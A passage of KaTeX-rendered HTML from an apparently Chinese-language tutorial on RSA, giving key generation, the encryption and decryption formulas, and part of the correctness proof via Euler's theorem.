class="mopen">(</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span></span></span></span>，根据数论基础知识，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mrow><mtext> </mtext><mi>p</mi></mrow><mo stretchy="false">)</mo><mo>=</mo><mtext> </mtext><mi>p</mi><mtext> </mtext><mo>−</mo><mtext> </mtext><mn>1</mn><mo separator="true">,</mo><mi>φ</mi><mo stretchy="false">(</mo><mrow><mtext> </mtext><mi>q</mi></mrow><mo stretchy="false">)</mo><mo>=</mo><mtext> </mtext><mi>q</mi><mtext> </mtext><mo>−</mo><mtext> </mtext><mn>1</mn></mrow><annotation encoding="application/x-tex">\varphi({\ p})=\ p\ -\ 1,\varphi({\ q})=\ q\ -\ 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord"><span class="mspace"> </span><span class="mord mathnormal">p</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord"><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></li><li>选取公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>互素<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(\ p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></li><li>求得私钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>∗</mo><mi>e</mi><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d*e\equiv1\mod{\varphi(n)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4637em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，也就是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span>是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>模<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>的逆元</li></ul><h3 id="加密公式">加密公式</h3><p>用公钥对明文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>进行加密，得到密文<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>=</mo><mi>E</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c=E(m)=m^{e}\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7144em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p><h3 id="解密公式">解密公式</h3><p>用私钥进行解密</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>m</mi><mo>=</mo><mi>D</mi><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">m=D({c})=c^{d}\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">c</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8991em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p><h2 id="RSA证明">RSA证明</h2><p>由于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>∗</mo><mi>e</mi><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d*e\equiv1\mod{\varphi(n)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4637em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，所以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>∗</mo><mi>e</mi><mo>=</mo><mi>k</mi><mo>∗</mo><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">d*e=k*{\varphi(n)}+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></p><p>已知<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>≡</mo><msup><mi>m</mi><mi>e</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c\equiv m^{e}\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4637em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span>，则</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><msup><mi>c</mi><mi>d</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>≡</mo><msup><mi>m</mi><mrow><mi>e</mi><mo>∗</mo><mi>d</mi></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>≡</mo><msup><mi>m</mi><mrow><mi>k</mi><mo>∗</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned} c^{d}\mod{n}&amp;\equiv m^{e*d}\mod{n} \\&amp;\equiv m^{k*\varphi(n)+1}\mod{n}\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.1571em;vertical-align:-1.3286em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8286em;"><span style="top:-3.9294em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span><span style="top:-2.3314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.3286em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8286em;"><span style="top:-3.9294em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span><span style="top:-2.3314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.3286em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>此时要分情况讨论</p><ul><li><p>当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>互质的时候</p><p>有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext> </mtext><msup><mi>m</mi><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup><mo>=</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">\ m^{\varphi(n)}=1\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mspace"> </span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span>则此时有</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msup><mi>m</mi><mrow><mi>k</mi><mo>∗</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>≡</mo><msup><mn>1</mn><mi>k</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><msup><mi>m</mi><mrow><mi>k</mi><mo>∗</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow></msup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>≡</mo><mi>m</mi><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}  m^{k*\varphi(n)}&amp;\equiv1^{k}\mod{n}  \\&amp;\equiv 1\mod{n} \\m^{k*\varphi(n)+1}&amp;\equiv m\mod{n} \end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.696em;vertical-align:-2.098em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.598em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span><span style="top:-1.562em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">∗</span><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.098em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.598em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span><span style="top:-1.562em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">m</span><span class="mspace allowbreak"></span><span class="mspace" 